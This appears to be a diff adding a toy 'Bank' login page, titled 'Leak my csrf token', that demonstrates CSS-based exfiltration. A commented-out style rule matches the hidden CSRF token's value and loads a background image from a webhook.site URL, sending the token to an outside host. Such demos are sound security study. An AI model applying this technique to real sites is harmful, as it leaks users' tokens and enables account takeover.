@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Leak my csrf token</title>
+    <!-- <style>
+        input[name="csrf-token"][value="abcd-1234"] + input {
+            background: url("https://webhook.site/...?tok");
+        }
+    </style> -->
+</head>
+<body>
+    <h1>Bank</h1>
+    <p>We have a CSRF token! Go away hacker blobcats</p>
+    <form>
+        <input type="hidden" name="csrf-token" value="abcd-1234" />
+        <input type="text" name="username" />
+        <input type="password" name="password" />
+        <button type="submit">Submit</button>
+    </form>
+</body>
+</html>
